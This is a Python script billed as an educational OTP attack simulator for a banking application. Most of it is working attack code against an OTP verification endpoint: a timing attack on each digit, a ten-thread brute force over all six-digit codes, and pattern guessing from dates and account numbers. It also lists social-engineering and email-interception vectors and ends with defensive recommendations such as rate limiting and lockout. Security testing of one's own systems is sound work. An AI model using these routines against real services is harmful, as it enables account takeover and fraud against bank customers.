#!/usr/bin/env python3
"""
Advanced OTP Attack Simulation
Educational tool for testing OTP security in your own banking application
"""

import requests
import threading
import time
import itertools
import json
from datetime import datetime
import smtplib
import imaplib
import email
import re

class OTPAttackSimulator:
    def __init__(self, base_url="http://localhost:5000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.found_otp = None
        
    def timing_attack_otp_verification(self, account_number):
        """
        Timing attack to determine OTP digits
        Real OTP verification might take different time than invalid ones
        """
        print("🕐 Performing OTP Timing Attack...")
        
        timing_results = {}
        
        # Test each digit position
        for position in range(6):  # 6-digit OTP
            digit_times = {}
            
            for digit in range(10):  # 0-9
                test_otp = "000000"
                test_otp = test_otp[:position] + str(digit) + test_otp[position+1:]
                
                start_time = time.time()
                
                try:
                    response = self.session.post(f"{self.base_url}/api/auth/verify-otp", 
                                               json={
                                                   "account_number": account_number,
                                                   "otp": test_otp
                                               })
                    end_time = time.time()
                    
                    digit_times[digit] = end_time - start_time
                    
                except Exception as e:
                    pass
                    
            # Find digit with different timing
            avg_time = sum(digit_times.values()) / len(digit_times)
            for digit, timing in digit_times.items():
                if abs(timing - avg_time) > 0.01:  # 10ms difference
                    print(f"⚠️  Possible correct digit {digit} at position {position}")
                    
    def parallel_otp_brute_force(self, account_number, num_threads=10):
        """
        Multi-threaded OTP brute force attack
        Tests multiple OTP combinations simultaneously
        """
        print(f"🔥 Starting Parallel OTP Brute Force with {num_threads} threads...")
        
        # Generate all possible 6-digit combinations
        otp_range = range(1000000)  # 000000 to 999999
        
        def worker(start, end):
            for i in range(start, end):
                if self.found_otp:
                    return
                    
                otp = f"{i:06d}"  # Format as 6-digit string
                
                try:
                    response = self.session.post(f"{self.base_url}/api/auth/verify-otp",
                                               json={
                                                   "account_number": account_number,
                                                   "otp": otp
                                               })
                    
                    if response.status_code == 200 and "token" in response.text:
                        self.found_otp = otp
                        print(f"🎯 OTP CRACKED: {otp}")
                        return
                        
                except Exception as e:
                    pass
                    
                time.sleep(0.01)  # Small delay to avoid overwhelming server
                
        # Divide work among threads
        chunk_size = 1000000 // num_threads
        threads = []
        
        for i in range(num_threads):
            start = i * chunk_size
            end = (i + 1) * chunk_size if i < num_threads - 1 else 1000000
            
            thread = threading.Thread(target=worker, args=(start, end))
            threads.append(thread)
            thread.start()
            
        # Wait for threads to complete or OTP to be found
        for thread in threads:
            thread.join()
            
        return self.found_otp
        
    def pattern_based_attack(self, account_number):
        """
        Attack using common OTP patterns
        Many systems use predictable OTP generation
        """
        print("🎯 Testing Common OTP Patterns...")
        
        # Common patterns people use
        common_patterns = [
            # Simple sequences
            "123456", "654321", "111111", "000000", "222222",
            "333333", "444444", "555555", "666666", "777777",
            "888888", "999999", "123123", "456456", "789789",
            
            # Date-based (current date)
            datetime.now().strftime("%d%m%y"),  # DDMMYY
            datetime.now().strftime("%m%d%y"),  # MMDDYY
            datetime.now().strftime("%y%m%d"),  # YYMMDD
            
            # Time-based
            datetime.now().strftime("%H%M%S"),  # HHMMSS
            
            # Account number patterns
            account_number[-6:] if len(account_number) >= 6 else account_number,
            account_number[:6] if len(account_number) >= 6 else account_number,
        ]
        
        for pattern in common_patterns:
            try:
                response = self.session.post(f"{self.base_url}/api/auth/verify-otp",
                                           json={
                                               "account_number": account_number,
                                               "otp": pattern
                                           })
                
                if response.status_code == 200 and "token" in response.text:
                    print(f"🎯 OTP CRACKED with pattern: {pattern}")
                    return pattern
                    
            except Exception as e:
                pass
                
        print("❌ Pattern-based attack failed")
        return None
        
    def quantum_otp_reverse_engineering(self):
        """
        Attempt to reverse engineer the quantum OTP generator
        Analyze multiple OTPs to find patterns
        """
        print("🔬 Attempting Quantum OTP Reverse Engineering...")
        
        # Collect multiple OTPs by triggering generation
        collected_otps = []
        
        for i in range(10):  # Collect 10 OTPs
            try:
                # Trigger OTP generation
                response = self.session.post(f"{self.base_url}/api/auth/login",
                                           json={
                                               "account_number": "1234567890",
                                               "password": "password123"
                                           })
                
                if response.status_code == 200:
                    print(f"OTP #{i+1} generated (check email)")
                    # In real scenario, you'd extract OTP from email
                    
                time.sleep(2)  # Wait between requests
                
            except Exception as e:
                pass
                
        print("📊 Analyzing OTP patterns...")
        print("Note: Real analysis would require actual OTP values from email")
        
    def social_engineering_attack(self):
        """
        Simulate social engineering attack vectors
        """
        print("🎭 Social Engineering Attack Vectors:")
        print("1. Phone call impersonating bank support")
        print("2. Phishing email requesting OTP")
        print("3. SMS spoofing bank number")
        print("4. Fake mobile app requesting credentials")
        print("5. SIM card cloning/swapping")
        
    def email_interception_simulation(self):
        """
        Simulate email interception attack
        Note: This would only work if attacker has email access
        """
        print("📧 Email Interception Attack Simulation:")
        print("Potential attack vectors:")
        print("- Compromised email account")
        print("- Man-in-the-middle on email traffic")
        print("- Email server vulnerabilities")
        print("- Insider threat at email provider")
        
    def run_otp_security_test(self, account_number="1234567890"):
        """
        Run comprehensive OTP security assessment
        """
        print("🚀 Starting OTP Security Assessment")
        print("=" * 60)
        
        # First, trigger OTP generation
        print("📧 Triggering OTP generation...")
        try:
            login_response = self.session.post(f"{self.base_url}/api/auth/login",
                                             json={
                                                 "account_number": account_number,
                                                 "password": "password123"
                                             })
            
            if login_response.status_code == 200:
                print("✅ OTP sent successfully")
                
                # Test different attack methods
                result = self.pattern_based_attack(account_number)
                if not result:
                    self.timing_attack_otp_verification(account_number)
                    
                # Only run brute force if specifically requested (very aggressive)
                # self.parallel_otp_brute_force(account_number, 5)
                
                self.quantum_otp_reverse_engineering()
                self.social_engineering_attack()
                self.email_interception_simulation()
                
            else:
                print("❌ Failed to trigger OTP generation")
                
        except Exception as e:
            print(f"❌ Error during OTP test: {e}")
            
        print("\n📋 OTP Security Recommendations:")
        print("1. Use cryptographically secure random number generation")
        print("2. Implement proper rate limiting (max 3 attempts)")
        print("3. Use time-based expiry (5-10 minutes)")
        print("4. Implement account lockout after failed attempts")
        print("5. Use HTTPS for all OTP transmissions")
        print("6. Consider TOTP (Time-based OTP) for better security")
        print("7. Implement IP-based restrictions")
        print("8. Use multi-factor authentication beyond SMS/Email")

if __name__ == "__main__":
    print("⚠️  ADVANCED OTP ATTACK SIMULATION")
    print("Educational tool for testing YOUR banking application")
    print("Use only on applications you own!")
    
    attacker = OTPAttackSimulator()
    attacker.run_otp_security_test()